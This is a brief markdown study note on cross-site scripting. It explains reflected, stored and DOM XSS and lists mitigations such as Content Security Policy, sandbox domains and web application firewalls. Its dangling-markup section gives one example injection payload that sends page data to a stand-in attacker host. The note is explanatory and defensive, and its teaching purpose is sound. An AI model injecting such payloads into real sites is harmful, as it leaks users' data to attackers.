# Cross-Site Scripting (XSS)

###Impact

Allows attacker to:
- circumvent same origin policy
- masquerade as victim
- access victim's data

## XSS Type

### Reflected XSS
When an application receives data in an HTTP request and includes the data in the immediate response in an unsafe way.

### Stored XSS
When an application receives data and includes the data in an unsafe manner in later responses.

### DOM XSS
When an application contains client-side JavaScript that processes data in an unsafe way.

## Extension of XSS attack

### Dangling Markup Injection
Technique for captureing data cross-domain in situations where a full XSS attack is not possible.
Inject payload like below to tags that contain value that is unfiltered.
```
"><img src='//attacker-website.com?
```

## Mitigation Type

### Content Security Policy
CSP is a set of directives that control which resources a web page can load, such as JavaScript, CSS, and images. When a website specifies a CSP, the browser blocks requests for assets that don't come from the specified sources.

### Browser Sandbox
Present the content of the webpage on another domain so if an XSS vulnerability exist the JavaScript will not execute on the important domain.

### Web Application Firewall
Using WAF to directly filter out potentially malicious input.
